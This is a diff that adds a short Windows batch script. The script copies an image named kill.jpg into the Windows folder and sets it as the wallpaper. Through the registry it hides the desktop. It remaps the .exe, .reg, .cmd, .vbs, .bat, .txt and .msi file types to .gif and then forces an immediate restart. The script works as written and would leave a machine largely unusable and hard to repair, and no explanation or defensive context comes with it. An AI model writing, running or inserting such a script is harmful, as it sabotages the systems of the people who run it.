@@ -1,0 +1,15 @@
+copy kill.jpg %windir%\kill.jpg
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d  "%windir%\kill.jpg" /f
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v NoDesktop /t REG_DWORD /d 1 /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+assoc .exe=.gif
+assoc .reg=.gif
+assoc .cmd=.gif
+assoc .vbs=.gif
+assoc .bat=.gif
+assoc .txt=.gif
+assoc .msi=.gif
+shutdown /r /t 0
+
+shutdown /r /t 0
